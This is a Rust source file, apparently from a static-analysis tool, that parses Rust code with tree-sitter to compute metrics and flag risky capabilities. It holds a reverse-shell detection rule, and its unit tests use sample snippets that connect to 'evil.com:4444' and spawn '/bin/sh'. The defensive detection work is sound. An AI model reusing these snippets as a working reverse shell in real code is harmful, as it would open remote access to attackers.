use crate::analyzers::Analyzer;
use crate::analyzers::{
    comment_metrics::{self, CommentStyle},
    function_metrics::{self, FunctionInfo},
    identifier_metrics, string_metrics, text_metrics,
};
use crate::capabilities::CapabilityMapper;
use crate::types::*;
use anyhow::{Context, Result};
use std::cell::RefCell;
use std::fs;
use std::path::Path;
use tree_sitter::Parser;

/// Rust analyzer using tree-sitter
pub struct RustAnalyzer {
    parser: RefCell<Parser>,
    capability_mapper: CapabilityMapper,
}

impl RustAnalyzer {
    pub fn new() -> Self {
        let mut parser = Parser::new();
        parser
            .set_language(&tree_sitter_rust::LANGUAGE.into())
            .unwrap();

        Self {
            parser: RefCell::new(parser),
            capability_mapper: CapabilityMapper::empty(),
        }
    }

    /// Create analyzer with pre-existing capability mapper (avoids duplicate loading)
    pub fn with_capability_mapper(mut self, capability_mapper: CapabilityMapper) -> Self {
        self.capability_mapper = capability_mapper;
        self
    }

    fn analyze_source(&self, file_path: &Path, content: &str) -> Result<AnalysisReport> {
        let start = std::time::Instant::now();

        // Parse the Rust source
        let tree = self
            .parser
            .borrow_mut()
            .parse(content, None)
            .context("Failed to parse Rust source")?;

        let root = tree.root_node();

        // Create target info
        let target = TargetInfo {
            path: file_path.display().to_string(),
            file_type: "rust".to_string(),
            size_bytes: content.len() as u64,
            sha256: self.calculate_sha256(content.as_bytes()),
            architectures: None,
        };

        let mut report = AnalysisReport::new(target);

        // Add structural feature
        report.structure.push(StructuralFeature {
            id: "source/language/rust".to_string(),
            description: "Rust source code".to_string(),
            evidence: vec![Evidence {
                method: "parser".to_string(),
                source: "tree-sitter-rust".to_string(),
                value: "rust".to_string(),
                location: Some("AST".to_string()),
            }],
        });

        // Detect capabilities and patterns (hardcoded)
        self.detect_capabilities(&root, content.as_bytes(), &mut report);

        // Extract functions
        self.extract_functions(&root, content.as_bytes(), &mut report);

        // Compute metrics for ML analysis
        let metrics = self.compute_metrics(&root, content);
        report.metrics = Some(metrics);

        // Evaluate trait definitions and composite rules from YAML
        let trait_findings = self
            .capability_mapper
            .evaluate_traits(&report, content.as_bytes());

        // Add atomic traits first so composite rules can reference them
        for f in trait_findings {
            if !report.findings.iter().any(|existing| existing.id == f.id) {
                report.findings.push(f);
            }
        }

        let composite_findings = self
            .capability_mapper
            .evaluate_composite_rules(&report, content.as_bytes());

        // Add composite findings
        for f in composite_findings {
            if !report.findings.iter().any(|existing| existing.id == f.id) {
                report.findings.push(f);
            }
        }

        report.metadata.analysis_duration_ms = start.elapsed().as_millis() as u64;
        report.metadata.tools_used = vec!["tree-sitter-rust".to_string()];

        Ok(report)
    }

    fn compute_metrics(&self, root: &tree_sitter::Node, content: &str) -> Metrics {
        let source = content.as_bytes();
        let total_lines = content.lines().count() as u32;

        let text = text_metrics::analyze_text(content);

        let identifiers = self.extract_identifiers(root, source);
        let ident_refs: Vec<&str> = identifiers.iter().map(|s| s.as_str()).collect();
        let identifier_metrics = identifier_metrics::analyze_identifiers(&ident_refs);

        let strings = self.extract_string_literals(root, source);
        let str_refs: Vec<&str> = strings.iter().map(|s| s.as_str()).collect();
        let string_metrics = string_metrics::analyze_strings(&str_refs);

        let comment_metrics = comment_metrics::analyze_comments(content, CommentStyle::CStyle);

        let func_infos = self.extract_function_info(root, source);
        let func_metrics = function_metrics::analyze_functions(&func_infos, total_lines);

        let rust_metrics = self.compute_rust_metrics(root, source);

        Metrics {
            text: Some(text),
            identifiers: Some(identifier_metrics),
            strings: Some(string_metrics),
            comments: Some(comment_metrics),
            functions: Some(func_metrics),
            rust_metrics: Some(rust_metrics),
            ..Default::default()
        }
    }

    fn compute_rust_metrics(&self, root: &tree_sitter::Node, source: &[u8]) -> RustMetrics {
        let mut metrics = RustMetrics::default();
        let mut cursor = root.walk();
        self.walk_for_rust_metrics(&mut cursor, source, &mut metrics);
        metrics
    }

    fn walk_for_rust_metrics(
        &self,
        cursor: &mut tree_sitter::TreeCursor,
        source: &[u8],
        metrics: &mut RustMetrics,
    ) {
        loop {
            let node = cursor.node();
            match node.kind() {
                "unsafe_block" => metrics.unsafe_block_count += 1,
                "function_item" => {
                    if let Ok(text) = node.utf8_text(source) {
                        if text.contains("unsafe fn") {
                            metrics.unsafe_fn_count += 1;
                        }
                        if text.contains("extern \"C\"") || text.contains("extern \"system\"") {
                            metrics.extern_fn_count += 1;
                        }
                    }
                }
                "extern_block" => metrics.extern_block_count += 1,
                "pointer_type" => metrics.raw_pointer_count += 1,
                "call_expression" => {
                    if let Ok(text) = node.utf8_text(source) {
                        if text.contains("transmute") {
                            metrics.transmute_count += 1;
                        }
                        if text.contains("Command::new") {
                            metrics.command_count += 1;
                        }
                    }
                }
                "macro_invocation" => {
                    if let Ok(text) = node.utf8_text(source) {
                        if text.contains("include_bytes!") {
                            metrics.include_bytes_count += 1;
                        }
                        if text.contains("include_str!") {
                            metrics.include_str_count += 1;
                        }
                    }
                }
                "attribute" => {
                    if let Ok(text) = node.utf8_text(source) {
                        if text.contains("link") {
                            metrics.link_attribute_count += 1;
                        }
                    }
                }
                _ => {}
            }

            if cursor.goto_first_child() {
                self.walk_for_rust_metrics(cursor, source, metrics);
                cursor.goto_parent();
            }
            if !cursor.goto_next_sibling() {
                break;
            }
        }
    }

    fn extract_identifiers(&self, root: &tree_sitter::Node, source: &[u8]) -> Vec<String> {
        let mut identifiers = Vec::new();
        let mut cursor = root.walk();
        self.walk_for_identifiers(&mut cursor, source, &mut identifiers);
        identifiers
    }

    fn walk_for_identifiers(
        &self,
        cursor: &mut tree_sitter::TreeCursor,
        source: &[u8],
        identifiers: &mut Vec<String>,
    ) {
        loop {
            let node = cursor.node();
            if node.kind() == "identifier" || node.kind() == "field_identifier" {
                if let Ok(text) = node.utf8_text(source) {
                    if !text.is_empty() {
                        identifiers.push(text.to_string());
                    }
                }
            }
            if cursor.goto_first_child() {
                self.walk_for_identifiers(cursor, source, identifiers);
                cursor.goto_parent();
            }
            if !cursor.goto_next_sibling() {
                break;
            }
        }
    }

    fn extract_string_literals(&self, root: &tree_sitter::Node, source: &[u8]) -> Vec<String> {
        let mut strings = Vec::new();
        let mut cursor = root.walk();
        self.walk_for_strings(&mut cursor, source, &mut strings);
        strings
    }

    fn walk_for_strings(
        &self,
        cursor: &mut tree_sitter::TreeCursor,
        source: &[u8],
        strings: &mut Vec<String>,
    ) {
        loop {
            let node = cursor.node();
            if node.kind() == "string_literal" || node.kind() == "raw_string_literal" {
                if let Ok(text) = node.utf8_text(source) {
                    let s = text
                        .trim_start_matches('"')
                        .trim_end_matches('"')
                        .trim_start_matches("r#\"")
                        .trim_end_matches("\"#");
                    if !s.is_empty() {
                        strings.push(s.to_string());
                    }
                }
            }
            if cursor.goto_first_child() {
                self.walk_for_strings(cursor, source, strings);
                cursor.goto_parent();
            }
            if !cursor.goto_next_sibling() {
                break;
            }
        }
    }

    fn extract_function_info(&self, root: &tree_sitter::Node, source: &[u8]) -> Vec<FunctionInfo> {
        let mut functions = Vec::new();
        let mut cursor = root.walk();
        self.walk_for_function_info(&mut cursor, source, &mut functions, 0);
        functions
    }

    fn walk_for_function_info(
        &self,
        cursor: &mut tree_sitter::TreeCursor,
        source: &[u8],
        functions: &mut Vec<FunctionInfo>,
        depth: u32,
    ) {
        loop {
            let node = cursor.node();
            let kind = node.kind();

            if kind == "function_item" {
                let mut info = FunctionInfo::default();
                if let Some(name_node) = node.child_by_field_name("name") {
                    if let Ok(name) = name_node.utf8_text(source) {
                        info.name = name.to_string();
                    }
                }
                // Check for async
                if let Ok(text) = node.utf8_text(source) {
                    info.is_async = text.starts_with("async ");
                }
                // Get parameters
                if let Some(params_node) = node.child_by_field_name("parameters") {
                    let mut param_cursor = params_node.walk();
                    if param_cursor.goto_first_child() {
                        loop {
                            let param = param_cursor.node();
                            if param.kind() == "parameter" {
                                info.param_count += 1;
                                if let Some(name_node) = param.child_by_field_name("pattern") {
                                    if let Ok(name) = name_node.utf8_text(source) {
                                        info.param_names.push(name.to_string());
                                    }
                                }
                            }
                            if !param_cursor.goto_next_sibling() {
                                break;
                            }
                        }
                    }
                }
                info.start_line = node.start_position().row as u32;
                info.end_line = node.end_position().row as u32;
                info.line_count = info.end_line.saturating_sub(info.start_line) + 1;
                info.nesting_depth = depth;
                functions.push(info);
            }

            if cursor.goto_first_child() {
                let new_depth = if kind == "function_item" {
                    depth + 1
                } else {
                    depth
                };
                self.walk_for_function_info(cursor, source, functions, new_depth);
                cursor.goto_parent();
            }
            if !cursor.goto_next_sibling() {
                break;
            }
        }
    }

    fn detect_capabilities(
        &self,
        node: &tree_sitter::Node,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        let mut cursor = node.walk();
        self.walk_ast(&mut cursor, source, report);
    }

    fn walk_ast(
        &self,
        cursor: &mut tree_sitter::TreeCursor,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        loop {
            let node = cursor.node();

            match node.kind() {
                "call_expression" => {
                    self.analyze_call(&node, source, report);
                }
                "use_declaration" => {
                    self.analyze_import(&node, source, report);
                }
                "unsafe_block" => {
                    self.analyze_unsafe(&node, source, report);
                }
                "macro_invocation" => {
                    self.analyze_macro(&node, source, report);
                }
                "function_item" => {
                    // Will handle in extract_functions
                }
                _ => {}
            }

            // Recurse
            if cursor.goto_first_child() {
                self.walk_ast(cursor, source, report);
                cursor.goto_parent();
            }

            if !cursor.goto_next_sibling() {
                break;
            }
        }
    }

    fn analyze_call(&self, node: &tree_sitter::Node, source: &[u8], report: &mut AnalysisReport) {
        if let Ok(text) = node.utf8_text(source) {
            let mut capabilities = Vec::new();

            // Reverse shell pattern (example of complex pattern still better in code for now)
            if (text.contains("TcpStream::connect") || text.contains("TcpStream"))
                && (text.contains("Command::new")
                    || text.contains("/bin/sh")
                    || text.contains("cmd.exe"))
            {
                capabilities.push((
                    "c2/reverse-shell",
                    "Reverse shell connection",
                    "TcpStream+Command",
                    0.98,
                    Criticality::Hostile,
                ));
            }

            // Add capabilities
            for (cap_id, desc, method, conf, criticality) in capabilities {
                report.findings.push(Finding {
                    kind: FindingKind::Capability,
                    trait_refs: vec![],
                    id: cap_id.to_string(),
                    description: desc.to_string(),
                    confidence: conf,
                    criticality,
                    mbc: None,
                    attack: None,
                    evidence: vec![Evidence {
                        method: "ast".to_string(),
                        source: "tree-sitter-rust".to_string(),
                        value: method.to_string(),
                        location: Some(format!(
                            "{}:{}",
                            node.start_position().row,
                            node.start_position().column
                        )),
                    }],
                });
            }
        }
    }

    fn analyze_import(
        &self,
        _node: &tree_sitter::Node,
        _source: &[u8],
        _report: &mut AnalysisReport,
    ) {
        // Most imports are now handled via YAML traits
    }

    fn analyze_unsafe(
        &self,
        node: &tree_sitter::Node,
        _source: &[u8],
        report: &mut AnalysisReport,
    ) {
        // Any unsafe block is noteworthy
        report.findings.push(Finding {
            kind: FindingKind::Capability,
            trait_refs: vec![],
            id: "unsafe/block".to_string(),
            description: "Unsafe code block".to_string(),
            confidence: 1.0,
            criticality: Criticality::Notable,
            mbc: None,
            attack: None,
            evidence: vec![Evidence {
                method: "ast".to_string(),
                source: "tree-sitter-rust".to_string(),
                value: "unsafe block".to_string(),
                location: Some(format!(
                    "{}:{}",
                    node.start_position().row,
                    node.start_position().column
                )),
            }],
        });
    }

    fn analyze_macro(
        &self,
        _node: &tree_sitter::Node,
        _source: &[u8],
        _report: &mut AnalysisReport,
    ) {
        // Most macros are now handled via YAML traits
    }

    fn extract_functions(
        &self,
        node: &tree_sitter::Node,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        let mut cursor = node.walk();
        self.walk_for_functions(&mut cursor, source, report);
    }

    fn walk_for_functions(
        &self,
        cursor: &mut tree_sitter::TreeCursor,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        loop {
            let node = cursor.node();

            if node.kind() == "function_item" {
                if let Ok(_text) = node.utf8_text(source) {
                    // Extract function name
                    let name = self
                        .extract_function_name(&node, source)
                        .unwrap_or_else(|| "anonymous".to_string());

                    let complexity = self.calculate_cyclomatic_complexity(&node, source);
                    let nesting = self.calculate_nesting_depth(&node);
                    let call_patterns = self.analyze_call_patterns(&node, source, &name);

                    // Extract actual function calls
                    let mut calls = Vec::new();
                    let mut call_cursor = node.walk();
                    self.walk_for_calls(&mut call_cursor, source, &mut calls);
                    calls.sort();
                    calls.dedup();

                    report.functions.push(Function {
                        name,
                        offset: Some(format!("0x{:x}", node.start_byte())),
                        size: Some((node.end_byte() - node.start_byte()) as u64),
                        complexity: Some(complexity),
                        calls,
                        source: "tree-sitter-rust".to_string(),
                        control_flow: Some(ControlFlowMetrics {
                            cyclomatic_complexity: complexity,
                            basic_blocks: complexity, // Approximation
                            edges: if complexity > 1 { complexity + 1 } else { 1 },
                            out_degree: call_patterns.unique_callees,
                            ..Default::default()
                        }),
                        instruction_analysis: None,
                        register_usage: None,
                        constants: Vec::new(),
                        properties: Some(FunctionProperties {
                            is_recursive: call_patterns.recursive_calls > 0,
                            is_leaf: call_patterns.call_count == 0,
                            ..Default::default()
                        }),
                        signature: None,
                        nesting: Some(nesting),
                        call_patterns: Some(call_patterns),
                    });
                }
            }

            // Recurse
            if cursor.goto_first_child() {
                self.walk_for_functions(cursor, source, report);
                cursor.goto_parent();
            }

            if !cursor.goto_next_sibling() {
                break;
            }
        }
    }

    fn walk_for_calls(
        &self,
        cursor: &mut tree_sitter::TreeCursor,
        source: &[u8],
        calls: &mut Vec<String>,
    ) {
        loop {
            let node = cursor.node();
            if node.kind() == "call_expression" {
                if let Some(func_node) = node.child_by_field_name("function") {
                    if let Ok(text) = func_node.utf8_text(source) {
                        calls.push(text.to_string());
                    }
                }
            }
            if cursor.goto_first_child() {
                self.walk_for_calls(cursor, source, calls);
                cursor.goto_parent();
            }
            if !cursor.goto_next_sibling() {
                break;
            }
        }
    }

    fn calculate_cyclomatic_complexity(&self, node: &tree_sitter::Node, source: &[u8]) -> u32 {
        let mut complexity = 1;
        let mut cursor = node.walk();
        self.walk_for_complexity(&mut cursor, source, &mut complexity);
        complexity
    }

    fn walk_for_complexity(
        &self,
        cursor: &mut tree_sitter::TreeCursor,
        source: &[u8],
        complexity: &mut u32,
    ) {
        loop {
            let node = cursor.node();
            match node.kind() {
                "if_expression" | "match_arm" | "while_expression" | "for_expression"
                | "loop_expression" => {
                    *complexity += 1;
                }
                "binary_expression" => {
                    if let Ok(text) = node.utf8_text(source) {
                        if text.contains("&&") || text.contains("||") {
                            *complexity += 1;
                        }
                    }
                }
                _ => {}
            }
            if cursor.goto_first_child() {
                self.walk_for_complexity(cursor, source, complexity);
                cursor.goto_parent();
            }
            if !cursor.goto_next_sibling() {
                break;
            }
        }
    }

    fn calculate_nesting_depth(&self, node: &tree_sitter::Node) -> NestingMetrics {
        let mut max_depth = 0;
        let mut depths = Vec::new();
        let mut deep_nest_count = 0;

        fn traverse(
            node: &tree_sitter::Node,
            current_depth: u32,
            max: &mut u32,
            depths: &mut Vec<u32>,
            deep: &mut u32,
        ) {
            let mut depth = current_depth;
            match node.kind() {
                "if_expression" | "match_expression" | "for_expression" | "while_expression"
                | "loop_expression" => {
                    depth += 1;
                    depths.push(depth);
                    if depth > *max {
                        *max = depth;
                    }
                    if depth > 4 {
                        *deep += 1;
                    }
                }
                _ => {}
            }
            let mut cursor = node.walk();
            for child in node.children(&mut cursor) {
                traverse(&child, depth, max, depths, deep);
            }
        }

        traverse(node, 0, &mut max_depth, &mut depths, &mut deep_nest_count);

        NestingMetrics {
            max_depth,
            avg_depth: if !depths.is_empty() {
                depths.iter().sum::<u32>() as f32 / depths.len() as f32
            } else {
                0.0
            },
            deep_nest_count,
        }
    }

    fn analyze_call_patterns(
        &self,
        node: &tree_sitter::Node,
        source: &[u8],
        func_name: &str,
    ) -> CallPatternMetrics {
        let mut call_count = 0;
        let mut callees = Vec::new();
        let mut recursive_calls = 0;

        let mut cursor = node.walk();
        loop {
            let current = cursor.node();
            if current.kind() == "call_expression" {
                call_count += 1;
                if let Some(func_node) = current.child_by_field_name("function") {
                    if let Ok(text) = func_node.utf8_text(source) {
                        let name = text.to_string();
                        callees.push(name.clone());
                        if name == func_name {
                            recursive_calls += 1;
                        }
                    }
                }
            }
            if cursor.goto_first_child() {
                continue;
            }
            loop {
                if cursor.goto_next_sibling() {
                    break;
                }
                if !cursor.goto_parent() {
                    callees.sort();
                    callees.dedup();
                    return CallPatternMetrics {
                        call_count,
                        unique_callees: callees.len() as u32,
                        recursive_calls,
                        ..Default::default()
                    };
                }
            }
        }
    }

    fn extract_function_name(&self, node: &tree_sitter::Node, source: &[u8]) -> Option<String> {
        let mut cursor = node.walk();
        if cursor.goto_first_child() {
            loop {
                let child = cursor.node();
                if child.kind() == "identifier" {
                    return child.utf8_text(source).ok().map(|s| s.to_string());
                }
                if !cursor.goto_next_sibling() {
                    break;
                }
            }
        }
        None
    }

    fn calculate_sha256(&self, data: &[u8]) -> String {
        use sha2::{Digest, Sha256};
        let mut hasher = Sha256::new();
        hasher.update(data);
        format!("{:x}", hasher.finalize())
    }
}

impl Analyzer for RustAnalyzer {
    fn analyze(&self, file_path: &Path) -> Result<AnalysisReport> {
        let bytes = fs::read(file_path).context("Failed to read Rust file")?;
        let content = String::from_utf8_lossy(&bytes);
        self.analyze_source(file_path, &content)
    }

    fn can_analyze(&self, file_path: &Path) -> bool {
        file_path.extension().and_then(|e| e.to_str()) == Some("rs")
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    fn analyze_rust_code(code: &str) -> AnalysisReport {
        let analyzer = RustAnalyzer::new();
        let path = PathBuf::from("test.rs");
        analyzer.analyze_source(&path, code).unwrap()
    }

    #[test]
    fn test_can_analyze_rs_extension() {
        let analyzer = RustAnalyzer::new();
        assert!(analyzer.can_analyze(&PathBuf::from("test.rs")));
        assert!(analyzer.can_analyze(&PathBuf::from("/path/to/main.rs")));
    }

    #[test]
    fn test_cannot_analyze_other_extension() {
        let analyzer = RustAnalyzer::new();
        assert!(!analyzer.can_analyze(&PathBuf::from("test.c")));
        assert!(!analyzer.can_analyze(&PathBuf::from("test.py")));
    }

    #[test]
    fn test_structural_feature() {
        let code = r#"
fn main() {
    println!("Hello, world!");
}
"#;
        let report = analyze_rust_code(code);
        assert!(report
            .structure
            .iter()
            .any(|s| s.id == "source/language/rust"));
    }

    #[test]
    fn test_detect_command_new() {
        let code = r#"
use std::process::Command;
fn main() {
    Command::new("whoami").spawn().unwrap();
}
"#;
        let report = analyze_rust_code(code);
        assert!(report.findings.iter().any(|c| c.id == "exec/command/shell"));
    }

    #[test]
    fn test_detect_tcpstream_connect() {
        let code = r#"
use std::net::TcpStream;
fn main() {
    let stream = TcpStream::connect("evil.com:4444").unwrap();
}
"#;
        let report = analyze_rust_code(code);
        assert!(report.findings.iter().any(|c| c.id == "net/socket/create"));
    }

    #[test]
    fn test_detect_tcplistener_bind() {
        let code = r#"
use std::net::TcpListener;
fn main() {
    let listener = TcpListener::bind("127.0.0.1:8080").unwrap();
}
"#;
        let report = analyze_rust_code(code);
        assert!(report.findings.iter().any(|c| c.id == "net/socket/server"));
    }

    // Note: fs/file/delete detection moved to traits/fs/file/delete/rust.yaml

    #[test]
    fn test_detect_unsafe_block() {
        let code = r#"
fn main() {
    unsafe {
        let x = 42;
    }
}
"#;
        let report = analyze_rust_code(code);
        assert!(report.findings.iter().any(|c| c.id == "unsafe/block"));
    }

    #[test]
    fn test_detect_transmute() {
        let code = r#"
use std::mem;
fn main() {
    unsafe {
        let x: u32 = mem::transmute(42.0f32);
    }
}
"#;
        let report = analyze_rust_code(code);
        assert!(report.findings.iter().any(|c| c.id == "unsafe/transmute"));
    }

    #[test]
    fn test_detect_raw_pointers() {
        let code = r#"
fn main() {
    unsafe {
        let ptr: *const i32 = &42;
        let mut_ptr: *mut i32 = &mut 42;
    }
}
"#;
        let report = analyze_rust_code(code);
        assert!(report.findings.iter().any(|c| c.id == "unsafe/pointer"));
    }

    #[test]
    fn test_detect_inline_asm() {
        let code = r#"
use std::arch::asm;
fn main() {
    unsafe {
        asm!("nop");
    }
}
"#;
        let report = analyze_rust_code(code);
        assert!(report.findings.iter().any(|c| c.id == "unsafe/inline-asm"));
    }

    #[test]
    fn test_import_std_process() {
        let code = r#"
use std::process::Command;
fn main() {}
"#;
        let report = analyze_rust_code(code);
        assert!(report.findings.iter().any(|c| c.id == "exec/command/shell"));
    }

    #[test]
    fn test_import_std_net() {
        let code = r#"
use std::net::TcpStream;
fn main() {}
"#;
        let report = analyze_rust_code(code);
        assert!(report.findings.iter().any(|c| c.id == "net/socket/create"));
    }

    #[test]
    fn test_import_libc() {
        let code = r#"
use libc::fork;
fn main() {}
"#;
        let report = analyze_rust_code(code);
        assert!(report.findings.iter().any(|c| c.id == "exec/syscall"));
    }

    #[test]
    fn test_import_libloading() {
        let code = r#"
use libloading::Library;
fn main() {}
"#;
        let report = analyze_rust_code(code);
        assert!(report.findings.iter().any(|c| c.id == "exec/dylib/load"));
    }

    #[test]
    fn test_extract_functions() {
        let code = r#"
fn function_one() {
    println!("one");
}

fn function_two(x: i32) -> i32 {
    x + 1
}
"#;
        let report = analyze_rust_code(code);
        assert_eq!(report.functions.len(), 2);
        assert!(report.functions.iter().any(|f| f.name == "function_one"));
        assert!(report.functions.iter().any(|f| f.name == "function_two"));
    }

    #[test]
    fn test_multiple_capabilities() {
        let code = r#"
use std::process::Command;
use std::net::TcpStream;
fn main() {
    let stream = TcpStream::connect("evil.com:4444").unwrap();
    Command::new("/bin/sh").spawn().unwrap();
    unsafe {
        let ptr: *const i32 = &42;
    }
}
"#;
        let report = analyze_rust_code(code);
        assert!(report.findings.iter().any(|c| c.id == "net/socket/create"));
        assert!(report.findings.iter().any(|c| c.id == "exec/command/shell"));
        assert!(report.findings.iter().any(|c| c.id == "unsafe/block"));
        assert!(report.findings.len() >= 3);
    }
}
